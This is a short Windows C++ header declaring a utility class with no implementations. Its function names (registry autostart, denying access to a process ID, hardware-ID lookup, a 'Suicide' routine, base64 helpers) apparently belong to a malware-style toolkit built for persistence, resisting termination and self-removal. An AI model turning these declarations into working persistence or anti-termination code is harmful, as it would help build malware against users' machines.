#include <windows.h>
#include <string>
#include <sddl.h>
#include <tlhelp32.h>
#include <sstream>
#include <psapi.h>
#include <fstream>
#include <vector>
#include <string>

#pragma comment (lib, "psapi.lib")

using namespace std;

class Utils {
public:
	void AddToRegistry(std::string name, std::string path);

	char* getRandomNumbers(int Len);

	std::string getUserName();
	void DenyAccessToPId(DWORD pId);

	void writeFile(const std::string& fileName, const std::string& text);

	std::string GetFullPathFromProcId(DWORD pId);
	std::string getProcessName(DWORD pId);

	vector<string> listFilesInDirectory(string directoryName);

	std::wstring s2ws(const std::string& s);
	std::string ws2s(const std::wstring& s);

	std::string getHWID();

	void Suicide();

	std::string base64_encode(unsigned char const*, unsigned int len);
	std::string base64_decode(std::string const& s);
private:
};